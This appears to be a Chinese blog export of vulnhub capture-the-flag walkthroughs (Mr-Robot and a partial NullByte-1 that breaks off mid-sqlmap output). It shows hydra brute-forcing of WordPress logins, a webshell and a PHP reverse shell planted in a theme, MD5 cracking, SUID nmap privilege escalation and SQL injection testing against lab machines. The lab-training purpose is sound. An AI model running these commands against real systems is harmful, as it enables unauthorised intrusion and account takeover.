<p>看一看robots.txt<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTA3L3JvYm90cy50eHQ=">http://192.168.56.107/robots.txt<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure>

<p>此时第一个key已经有了<br><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguNTYuMTA3L2tleS0xLW9mLTMudHh0">http://192.168.56.107/key-1-of-3.txt<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>

<p>然后将fsocity.dic下载下来分析</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wget http://192.168.56.107/fsocity.dic</span></span><br><span class="line">--2020-01-02 20:53:02--  http://192.168.56.107/fsocity.dic</span><br><span class="line">正在连接 192.168.56.107:80... 已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：7245381 (6.9M) [text/x-c]</span><br><span class="line">正在保存至: “fsocity.dic”</span><br><span class="line"></span><br><span class="line">fsocity.dic               100%[====================================&gt;]   6.91M  26.5MB/s  用时 0.3s    </span><br><span class="line"></span><br><span class="line">2020-01-02 20:53:02 (26.5 MB/s) - 已保存 “fsocity.dic” [7245381/7245381])</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># file fsocity.dic </span></span><br><span class="line">fsocity.dic: , name offset 0x620a7574</span><br><span class="line">root@kali:~<span class="comment"># wc -l fsocity.dic </span></span><br><span class="line">858160 fsocity.dic</span><br><span class="line">root@kali:~<span class="comment"># head fsocity.dic </span></span><br><span class="line"><span class="literal">true</span></span><br><span class="line"><span class="literal">false</span></span><br><span class="line">wikia</span><br><span class="line">from</span><br><span class="line">the</span><br><span class="line">now</span><br><span class="line">Wikia</span><br><span class="line">extensions</span><br><span class="line">scss</span><br><span class="line">window</span><br></pre></td></tr></table></figure>

<p>这看起来像一个自定义单词列表，其中包含800k +个单词。但是，似乎有很多重复了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sort fsocity.dic | uniq | wc -l</span></span><br><span class="line">11451</span><br></pre></td></tr></table></figure>

<p>将fsocity.dic去重</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># sort fsocity.dic | uniq &gt; fsocityrm.dic</span></span><br><span class="line">root@kali:~<span class="comment"># wc -l fsocityrm.dic</span></span><br><span class="line">11451 fsocityrm.dic</span><br></pre></td></tr></table></figure>

<p>可以看到去重之后的字典只有11451条了，显然在这里安装了wordpress。 如果浏览到/readme.html，可以看到使用的WordPress版本为4.3.9。要做的下一件事是在计算机上运行WpScan。 它揭示了几个过时的模块，但没有设法利用。<br>因此，决定专注于管理面板，并尝试强行爆破管理员账号密码。 第一步是找到有效的用户名。 不幸的是，该网站似乎没有任何帖子，因此没有作者信息出现。 WpScan也无法枚举用户。<br>幸运的是，有一个非常方便的工具叫做Hydra，它可以暴力破解几乎所有东西，包括HTTP格式的用户名。 这是尝试登录/wp-login.php时发出的POST请求</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /wp-login.php HTTP/1.1</span><br><span class="line">Host: 192.168.56.107</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 101</span><br><span class="line">Origin: http://192.168.56.107</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://192.168.56.107/wp-login.php?redirect_to=http%3A%2F%2F192.168.56.107%2Fwp-admin%2F&amp;reauth=1</span><br><span class="line">Cookie: s_fid=6F117A4BEDFCBCE8-0646B35B635BEF6C; s_nr=1577958190705; s_cc=<span class="literal">true</span>; s_sq=%5B%5BB%5D%5D; wordpress_test_cookie=WP+Cookie+check</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">log</span>=user&amp;<span class="built_in">pwd</span>=pass&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F192.168.56.107%2Fwp-admin%2F&amp;testcookie=1</span><br></pre></td></tr></table></figure>

<p>使用hydra爆破，第一步，尝试找到用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -L fsocityrm.dic -p wedontcare 192.168.56.107 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username&quot;</span></span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: elliot   password: wedontcare</span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: Elliot   password: wedontcare</span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: ELLIOT   password: wedontcare</span><br></pre></td></tr></table></figure>
<ul>
<li>得到用户名是elliot，不区分大小写。</li>
</ul>
<p><font color="red">分解下各个参数的含义</font></p>
<ul>
<li>-vV : 输出详情</li>
<li>-L fsocityrm.dic : 尝试fsocityrm.dic中的所有用户名</li>
<li>-p wedontcare : 使用唯一的密码没关系（我们现在只对用户名感兴趣）</li>
<li>192.168.56.107 : wordpress的ip地址</li>
<li>http-post-form : 要尝试的暴力手段，这里是HTTP POST表单</li>
<li>‘/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username’<br>/wp-login.php : 表单所在的路径<br>log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In : 要发送的POST参数。^USER^和^PASS^是占位符，将被替换为实际值。<br>F=Invalid username : 如果响应包含文本无效的用户名，则将尝试视为失败（F）</li>
</ul>
<p>得到用户名之后用hydra爆破密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># hydra -l elliot -P fsocityrm.dic 192.168.56.107 http-post-form &quot;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect.&quot; -t 64</span></span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.56.107   login: elliot   password: ER28-0652</span><br></pre></td></tr></table></figure>

<ul>
<li>得到密码：ER28-0652</li>
</ul>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub126.jpg"></p>
<p>将图片中的内容替换成冰蝎马，然后连接</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub127.jpg"></p>
<p>上传php-reverse-shell，然后kali端监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.107/wp-content/themes/twentyfifteen/phpreverseshell.php</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 5566</span></span><br><span class="line">listening on [any] 5566 ...</span><br><span class="line">192.168.56.107: inverse host lookup failed: Host name lookup failure</span><br><span class="line">connect to [192.168.56.102] from (UNKNOWN) [192.168.56.107] 52294</span><br><span class="line">Linux linux 3.13.0-55-generic <span class="comment">#94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 11:43:48 up  2:18,  0 users,  load average: 0.00, 0.15, 0.42</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1(daemon) gid=1(daemon) groups=1(daemon)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">daemon</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/sh&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure>

<p>成功弹回shell</p>
<p>找到第二个key，但是权限不足</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> home</span><br><span class="line"><span class="built_in">cd</span> home</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">robot</span><br><span class="line">$ <span class="built_in">cd</span> robot</span><br><span class="line"><span class="built_in">cd</span> robot</span><br><span class="line">$ ls</span><br><span class="line">ls</span><br><span class="line">key-2-of-3.txt  password.raw-md5</span><br><span class="line">$ cat key-2-of-3.txt</span><br><span class="line">cat key-2-of-3.txt</span><br><span class="line">cat: key-2-of-3.txt: Permission denied</span><br></pre></td></tr></table></figure>

<p>接着看看password.raw-md5有什么</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cat password.raw-md5</span><br><span class="line">cat password.raw-md5</span><br><span class="line">robot:c3fcd3d76192e4007dfb496cca67e13b</span><br></pre></td></tr></table></figure>

<p>显然，它看起来像是未加盐的MD5哈希密码，使用HashCat进行破解应该很容易。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./hashcat64.exe -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b D:/wordlists/rockyou.txt</span><br><span class="line">hashcat (v5.1.0) starting...</span><br><span class="line"></span><br><span class="line">* Device <span class="comment">#1: Intel&#x27;s OpenCL runtime (GPU only) is currently broken.</span></span><br><span class="line">             We are waiting <span class="keyword">for</span> updated OpenCL drivers from Intel.</span><br><span class="line">             You can use --force to override, but <span class="keyword">do</span> not report related errors.</span><br><span class="line">* Device <span class="comment">#3: WARNING! Kernel exec timeout is not disabled.</span></span><br><span class="line">             This may cause <span class="string">&quot;CL_OUT_OF_RESOURCES&quot;</span> or related errors.</span><br><span class="line">             To <span class="built_in">disable</span> the timeout, see: https://hashcat.net/q/timeoutpatch</span><br><span class="line">nvmlInit(): Unknown Error</span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#1: Intel(R) Corporation</span></span><br><span class="line">========================================</span><br><span class="line">* Device <span class="comment">#1: Intel(R) UHD Graphics 630, skipped.</span></span><br><span class="line">* Device <span class="comment">#2: Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, skipped.</span></span><br><span class="line"></span><br><span class="line">OpenCL Platform <span class="comment">#2: NVIDIA Corporation</span></span><br><span class="line">======================================</span><br><span class="line">* Device <span class="comment">#3: GeForce GTX 1070, 2048/8192 MB allocatable, 16MCU</span></span><br><span class="line"></span><br><span class="line">Hashes: 1 digests; 1 unique digests, 1 unique salts</span><br><span class="line">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates</span><br><span class="line">Rules: 1</span><br><span class="line"></span><br><span class="line">Applicable optimizers:</span><br><span class="line">* Zero-Byte</span><br><span class="line">* Early-Skip</span><br><span class="line">* Not-Salted</span><br><span class="line">* Not-Iterated</span><br><span class="line">* Single-Hash</span><br><span class="line">* Single-Salt</span><br><span class="line">* Raw-Hash</span><br><span class="line"></span><br><span class="line">Minimum password length supported by kernel: 0</span><br><span class="line">Maximum password length supported by kernel: 256</span><br><span class="line"></span><br><span class="line">ATTENTION! Pure (unoptimized) OpenCL kernels selected.</span><br><span class="line">This enables cracking passwords and salts &gt; length 32 but <span class="keyword">for</span> the price of drastically reduced performance.</span><br><span class="line">If you want to switch to optimized OpenCL kernels, append -O to your commandline.</span><br><span class="line"></span><br><span class="line">Watchdog: Temperature abort trigger <span class="built_in">set</span> to 90c</span><br><span class="line"></span><br><span class="line">Dictionary cache built:</span><br><span class="line">* Filename..: D:/wordlists/rockyou.txt</span><br><span class="line">* Passwords.: 14344392</span><br><span class="line">* Bytes.....: 139921507</span><br><span class="line">* Keyspace..: 14344385</span><br><span class="line">* Runtime...: 1 sec</span><br><span class="line"></span><br><span class="line">c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Type........: MD5</span><br><span class="line">Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b</span><br><span class="line">Time.Started.....: Fri Jan 03 11:57:09 2020 (0 secs)</span><br><span class="line">Time.Estimated...: Fri Jan 03 11:57:09 2020 (0 secs)</span><br><span class="line">Guess.Base.......: File (D:/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#3.........: 54880.6 kH/s (2.68ms) @ Accel:1024 Loops:1 Thr:64 Vec:1</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts</span><br><span class="line">Progress.........: 1048576/14344385 (7.31%)</span><br><span class="line">Rejected.........: 0/1048576 (0.00%)</span><br><span class="line">Restore.Point....: 0/14344385 (0.00%)</span><br><span class="line">Restore.Sub.<span class="comment">#3...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidates.<span class="comment">#3....: 123456 -&gt; Leslee</span></span><br><span class="line">Hardware.Mon.<span class="comment">#3..: N/A</span></span><br><span class="line"></span><br><span class="line">Started: Fri Jan 03 11:57:03 2020</span><br><span class="line">Stopped: Fri Jan 03 11:57:11 2020</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub128.jpg"></p>
<p>由于电脑的GPU配置超屌，所以密码一秒钟就出来了，是abcdefghijklmnopqrstuvwxyz</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure>

<p>直接登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ su robot</span><br><span class="line">su robot</span><br><span class="line">Password: abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">robot@linux:~$ id</span><br><span class="line">id</span><br><span class="line">uid=1002(robot) gid=1002(robot) groups=1002(robot)</span><br><span class="line">robot@linux:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">robot</span><br></pre></td></tr></table></figure>

<p>读取第二个key，帅呆了。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:~$ ls</span><br><span class="line">ls</span><br><span class="line">key-2-of-3.txt  password.raw-md5</span><br><span class="line">robot@linux:~$ cat key-2-of-3.txt</span><br><span class="line">cat key-2-of-3.txt</span><br><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>在MySQL数据库中没什么有趣的。 还有一个名为mich05654的WordPress用户，其密码为Dylan_2791，但似乎毫无用处。<br>经过一段时间的系统探索，发现了一个有趣的二进制文件，其SUID为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>

<p>是的，是NMap本身！ 确切地说，它是旧版本（3.81）。 有趣的是，可执行文件由root拥有。 由于其SUID位置1，因此如果设法让nmap运行命令，则nmap理论上可以以root用户身份执行命令。<br>看一下nmap –help的输出，可以告诉我们nmap具有–interactive选项，可以产生某种REPL。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:~$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">id</span><br><span class="line">uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>成功使用nmap提权，找到第3个key，挑战完成。。。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">firstboot_done  key-3-of-3.txt</span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwx------  3 root root 4096 Nov 13  2015 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Sep 16  2015 ..</span><br><span class="line">-rw-------  1 root root 4058 Nov 14  2015 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Nov 13  2015 .cache</span><br><span class="line">-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done</span><br><span class="line">-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 20  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Sep 16  2015 .rnd</span><br><span class="line"><span class="comment"># cat firstboot_done</span></span><br><span class="line">cat firstboot_done</span><br><span class="line"><span class="comment"># cat key-3-of-3.txt</span></span><br><span class="line">cat key-3-of-3.txt</span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br></pre></td></tr></table></figure>

<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[NullByte-1]</title>
    <url>/2020/01/02/NullByte-1/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：NullByte：1<br>发布日期：2015年8月1日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL2x5MG4ubWUvbnVsbGJ5dGUvTnVsbEJ5dGUub3ZhLnppcA==">http://ly0n.me/nullbyte/NullByte.ova.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9udWxsYnl0ZS9OdWxsQnl0ZS5vdmEuemlw">https://download.vulnhub.com/nullbyte/NullByte.ova.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9udWxsYnl0ZS9OdWxsQnl0ZS5vdmEuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/nullbyte/NullByte.ova.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<a id="more"></a>

<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>代号：NB0x01<br>下载：ly0n.me/nullbyte/NullByte.ova.zip<br>目标：转到/root/proof.txt并按照说明进行操作。<br>级别：基础到中级。<br>说明：Boot2root，Box将从dhcp获取IP，可与virtualbox＆vmware正常工作。<br>提示：使用您的横向思考技巧，也许您需要编写一些代码。</p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.106</span><br><span class="line">Host is up (0.00024s latency).</span><br><span class="line">MAC Address: 08:00:27:FE:89:AF (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -sV -Pn -v 192.168.56.106</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">111/tcp   open  rpcbind 2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)</span><br><span class="line">50480/tcp open  status  1 (RPC <span class="comment">#100024)</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -Pn -T5 -v -A --script=vuln -p 80,111,777,50480 192.168.56.106</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-csrf: Couldn<span class="string">&#x27;t find any CSRF vulnerabilities.</span></span><br><span class="line"><span class="string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /phpmyadmin/: phpMyAdmin</span><br><span class="line">|_  /uploads/: Potentially interesting folder</span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-stored-xss: Couldn<span class="string">&#x27;t find any stored XSS vulnerabilities.</span></span><br><span class="line"><span class="string">111/tcp   open  rpcbind 2-4 (RPC #100000)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">| rpcinfo: </span></span><br><span class="line"><span class="string">|   program version    port/proto  service</span></span><br><span class="line"><span class="string">|   100000  2,3,4        111/tcp   rpcbind</span></span><br><span class="line"><span class="string">|   100000  2,3,4        111/udp   rpcbind</span></span><br><span class="line"><span class="string">|   100000  3,4          111/tcp6  rpcbind</span></span><br><span class="line"><span class="string">|   100000  3,4          111/udp6  rpcbind</span></span><br><span class="line"><span class="string">|   100024  1          44704/tcp6  status</span></span><br><span class="line"><span class="string">|   100024  1          47970/udp6  status</span></span><br><span class="line"><span class="string">|   100024  1          50480/tcp   status</span></span><br><span class="line"><span class="string">|_  100024  1          54179/udp   status</span></span><br><span class="line"><span class="string">777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br><span class="line"><span class="string">50480/tcp open  status  1 (RPC #100024)</span></span><br><span class="line"><span class="string">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span></span><br></pre></td></tr></table></figure>

<p>可以看到ssh端口开在777</p>
<p>页面上有图像。 在页面源上没有找到任何内容。 但是图像中可能隐藏了一些东西，因此，使用exiftool读取图像，因此下载该图像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># exiftool main.gif </span></span><br><span class="line">ExifTool Version Number         : 11.80</span><br><span class="line">File Name                       : main.gif</span><br><span class="line">Directory                       : .</span><br><span class="line">File Size                       : 16 kB</span><br><span class="line">File Modification Date/Time     : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Access Date/Time           : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Inode Change Date/Time     : 2020:01:01 21:14:10-05:00</span><br><span class="line">File Permissions                : rw-r--r--</span><br><span class="line">File Type                       : GIF</span><br><span class="line">File Type Extension             : gif</span><br><span class="line">MIME Type                       : image/gif</span><br><span class="line">GIF Version                     : 89a</span><br><span class="line">Image Width                     : 235</span><br><span class="line">Image Height                    : 302</span><br><span class="line">Has Color Map                   : No</span><br><span class="line">Color Resolution Depth          : 8</span><br><span class="line">Bits Per Pixel                  : 1</span><br><span class="line">Background Color                : 0</span><br><span class="line">Comment                         : P-): kzMb5nVYJw</span><br><span class="line">Image Size                      : 235x302</span><br><span class="line">Megapixels                      : 0.071</span><br></pre></td></tr></table></figure>

<p>发现Comment处有一串字符kzMb5nVYJw，可能是密码或者目录</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub121.jpg"></p>
<p>假设是正确的，但这是一个key。 不知道密钥是什么，因此，使用字典攻击通过BurpSuite和rockyou.txt查找到密钥elite.</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub122.jpg"></p>
<p>输入密匙，跳转到下面的页面，要求输入username，猜测username处可能存在注入</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub123.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sqlmap.py -r sqlmap.txt</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.3.12.1<span class="comment">#dev&#125;</span></span><br><span class="line">|_ -| . [(]     | .<span class="string">&#x27;| . |</span></span><br><span class="line"><span class="string">|___|_  [&#x27;</span>]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap <span class="keyword">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="string">&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 10:41:51 /2020-01-02/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[10:41:51] [INFO] parsing HTTP request from &#x27;</span>sqlmap.txt<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] checking if the target is protected by some kind of WAF/IPS</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing if the target URL content is stable</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] target URL content is stable</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing if GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; is dynamic</span></span><br><span class="line"><span class="string">[10:41:51] [WARNING] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; does not appear to be dynamic</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] heuristic (basic) test shows that GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; might be injectable (possible DBMS: &#x27;</span>MySQL<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing for SQL injection on GET parameter &#x27;</span>usrtosearch<span class="string">&#x27;</span></span><br><span class="line"><span class="string">it looks like the back-end DBMS is &#x27;</span>MySQL<span class="string">&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span></span><br><span class="line"><span class="string">for the remaining tests, do you want to include all tests for &#x27;</span>MySQL<span class="string">&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>Boolean-based blind - Parameter replace (original value)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:51] [INFO] testing &#x27;</span>AND boolean-based blind - WHERE or HAVING clause (MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:52] [WARNING] reflective value(s) found and filtering out</span></span><br><span class="line"><span class="string">[10:41:52] [INFO] testing &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:52] [INFO] testing &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] GET parameter &#x27;</span>usrtosearch<span class="string">&#x27; appears to be &#x27;</span>OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)<span class="string">&#x27; injectable (with --not-string=&quot;ID&quot;)</span></span><br><span class="line"><span class="string">[10:41:53] [INFO] testing &#x27;</span>MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)<span 